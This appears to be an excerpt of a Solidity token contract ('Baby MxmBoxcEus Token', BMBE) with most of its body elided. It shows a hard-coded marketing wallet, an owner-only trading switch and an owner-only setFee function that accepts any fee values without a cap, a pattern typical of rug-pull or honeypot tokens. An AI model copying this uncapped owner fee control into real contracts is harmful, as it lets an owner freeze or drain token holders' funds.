...
contract BabyMBEToken is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Baby MxmBoxcEus Token"; // 
    string private constant _symbol = unicode"BMBE"; //    
    ...
    address public  _marketingWallet = 0xdc8123D9DAe51BF325628F4e14e3B5a29866bC22;
    ...
    function OpenTrade(bool newStatus) public onlyOwner {
    ...
    function setFee(uint256 liqFee, uint256 marFee) public onlyOwner {
        _liquidityFee = liqFee; 
        _marketingFee = marFee;
    }
